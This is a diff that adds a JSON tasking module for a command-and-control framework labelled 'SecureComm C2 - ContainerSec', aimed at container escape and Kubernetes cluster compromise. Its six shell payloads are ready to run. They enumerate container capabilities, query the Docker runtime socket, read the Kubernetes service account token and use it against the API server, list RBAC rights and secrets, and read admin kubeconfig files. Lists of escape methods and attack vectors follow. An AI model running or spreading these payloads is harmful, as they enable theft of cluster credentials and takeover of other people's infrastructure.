@@ -1,0 +1,76 @@
+{
+  "id": "container_kubernetes_escape",
+  "name": "Container Escape & K8s Cluster Compromise",
+  "description": "Advanced container breakout techniques, Kubernetes pod escape, privileged container exploitation, and cluster-wide persistence through admission controllers",
+  "version": "2.0",
+  "author": "SecureComm C2 - ContainerSec",
+  "category": "container-escape",
+  "platform": "linux",
+  "risk_level": "critical",
+  "requires_admin": false,
+  "commands": [
+    {
+      "type": "exec",
+      "payload": "cat /proc/1/cgroup 2>/dev/null | head -5; ls -la /proc/self/fd/ 2>/dev/null | grep -E 'socket:|pipe:'; cat /proc/self/status 2>/dev/null | grep -E 'CapEff|CapPrm|CapBnd'; echo '---'; id; whoami",
+      "description": "Container detection and capability enumeration",
+      "timeout": 30,
+      "container_technique": "container_detection"
+    },
+    {
+      "type": "exec",
+      "payload": "ls -la /var/run/docker.sock 2>/dev/null && curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>/dev/null | head -200 || echo 'No docker.sock'; ls -la /run/containerd/containerd.sock 2>/dev/null || echo 'No containerd.sock'",
+      "description": "Container runtime socket access validation",
+      "timeout": 45,
+      "container_technique": "socket_access"
+    },
+    {
+      "type": "exec",
+      "payload": "find / -name 'core_pattern' -type f 2>/dev/null; cat /proc/sys/kernel/core_pattern 2>/dev/null; ls -la /etc/cron.d/ /var/spool/cron/crontabs/ 2>/dev/null; mount | grep -E 'proc|sysfs|cgroup'",
+      "description": "Host filesystem exposure and kernel core_pattern abuse potential",
+      "timeout": 60,
+      "container_technique": "host_exposure_check"
+    },
+    {
+      "type": "exec",
+      "payload": "ls -la /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | wc -c; curl -s -k -H \"Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)\" https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/nodes 2>/dev/null | head -100 || echo 'K8s API check failed'",
+      "description": "Kubernetes service account token extraction and API access test",
+      "timeout": 45,
+      "container_technique": "k8s_token_extraction"
+    },
+    {
+      "type": "exec",
+      "payload": "kubectl get pods --all-namespaces -o wide 2>/dev/null | head -20 || echo 'No kubectl'; kubectl auth can-i --list 2>/dev/null | grep -E 'create|delete|exec|get' | head -20; kubectl get secrets --all-namespaces 2>/dev/null | wc -l",
+      "description": "Kubernetes RBAC enumeration and secret discovery",
+      "timeout": 90,
+      "container_technique": "rbac_enumeration"
+    },
+    {
+      "type": "exec",
+      "payload": "cat /etc/kubernetes/admin.conf 2>/dev/null | head -50 || cat /root/.kube/config 2>/dev/null | head -50 || find / -name 'kubeconfig' -type f 2>/dev/null | head -5; ls -la /etc/cni/net.d/ 2>/dev/null | head -10",
+      "description": "Kubernetes configuration file discovery and CNI access",
+      "timeout": 60,
+      "container_technique": "config_discovery"
+    }
+  ],
+  "container_escape_methods": [
+    "privileged_container_breakout",
+    "docker_socket_exploitation",
+    "kernel_capability_abuse",
+    "host_namespace_sharing",
+    "cgroups_release_agent",
+    "core_pattern_hijacking"
+  ],
+  "k8s_attack_vectors": [
+    "service_account_token_theft",
+    "admission_controller_manipulation",
+    "etcd_backup_extraction",
+    "kubelet_api_abuse",
+    "pod_security_policy_bypass"
+  ],
+  "target_runtimes": ["docker", "containerd", "cri-o", "podman"],
+  "mitre_techniques": ["T1610", "T1611", "T1552", "T1078", "T1053"],
+  "tags": ["container", "kubernetes", "k8s", "docker", "escape", "privilege-escalation", "2026"],
+  "created_at": "2026-02-11T12:00:00Z",
+  "updated_at": "2026-02-11T12:00:00Z",
+  "demonstration_notes": "Cutting-edge container escape and Kubernetes cluster compromise techniques for 2026 demonstrations"
+}
